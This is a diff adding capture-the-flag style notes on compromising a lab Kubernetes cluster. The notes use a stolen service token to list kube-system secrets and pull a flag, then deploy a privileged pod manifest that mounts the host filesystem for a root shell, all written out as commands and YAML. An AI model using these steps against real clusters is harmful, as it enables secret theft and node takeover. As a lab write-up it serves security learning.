@@ -1,0 +1,55 @@
+==we had token and ca.cert==
+
+```
+alias kubectl='kubectl --server=http://10.10.178.85:6443 --token=token_here_long_text --insecure-skip-tls-verify'
+kubectl get pods
+kubectl get namespaces
+kubectl get secrets -n kube-system
+kubectl get secrets -n kube-system flag3
+kubectl get secrets -n kube-system flag3 -o json
+```
+
+then to get root and shell
+
+==we will create malacious pod and use it to get root==
+
+```
+nano exploit.yaml
+https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
+https://bishopfox.com/blog/kubernetes-pod-privilege-escalation
+
+we can get many info from kubectl get node -o yaml
+and it also have image which we have to change in yaml file
+now we check and we haev 3 pods -->>> kubectl get pods
+we apply that exploit
+  
+  kubectl apply -f exploit.yaml
+  kubectl exec everything-allowed-exec-pod /bin/bash -it  #root shell
+  
+  
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: docker.io/library/nginx@sha256:6d75c99af15565a301e48297fa2d121e15d80ad526f8369c526324f0f7ccb750  #change
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing >
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+```
